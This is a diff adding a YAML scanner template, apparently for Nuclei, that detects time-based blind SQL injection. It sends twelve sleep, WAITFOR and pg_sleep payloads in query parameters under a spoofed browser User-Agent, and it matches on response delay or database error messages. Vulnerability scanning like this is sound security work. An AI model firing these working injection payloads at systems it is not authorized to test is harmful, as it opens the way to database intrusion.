@@ -1,0 +1,76 @@
+id: time-based-sqli
+name: SQL Injection - Time Based Detection
+version: 1.0
+author: Phantom Team
+severity: high
+description: >
+  Detects time-based blind SQL injection by injecting sleep/waitfor/pg_sleep
+  payloads and checking if the response time exceeds the expected delay.
+  Also falls back to error-based detection if database errors are returned.
+
+tags:
+  - sqli
+  - injection
+  - blind
+  - time-based
+
+references:
+  - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+requests:
+  - method: GET
+    path:
+      - "/?id={{payload}}"
+      - "/search?q={{payload}}"
+      - "/page?id={{payload}}"
+
+    redirects: false
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'"
+        - "if(now()=sysdate(),sleep(5),0)"
+        - "(select(0)from(select(sleep(5)))v)"
+        - "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+        - "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='"
+        - "1'XOR(if(now()=sysdate(),sleep(5),0))OR'"
+        - "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+        - "1 or sleep(5)#"
+        - "' WAITFOR DELAY '0:0:5'--"
+        - "';SELECT PG_SLEEP(5)--"
+        - "pg_sleep(5)"
+        - "'||pg_sleep(5)--"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration > 5"
+
+      - type: regex
+        regex:
+          - "check the manual that (corresponds to|fits) your (MySQL|MariaDB) server version"
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "PG::SyntaxError:"
+          - "PSQLException"
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "System\\.Data\\.SqlClient\\.SqlException"
+          - "ODBC SQL Server Driver"
+          - "SQLite\\.Exception"
+          - "sqlite3.OperationalError:"
+          - "CLI Driver.*?DB2"
+          - "DB2 SQL error"
+          - "Dynamic SQL Error"
+          - "encountered after end of query"
+        condition: or
+
+stop-at-first-match: true
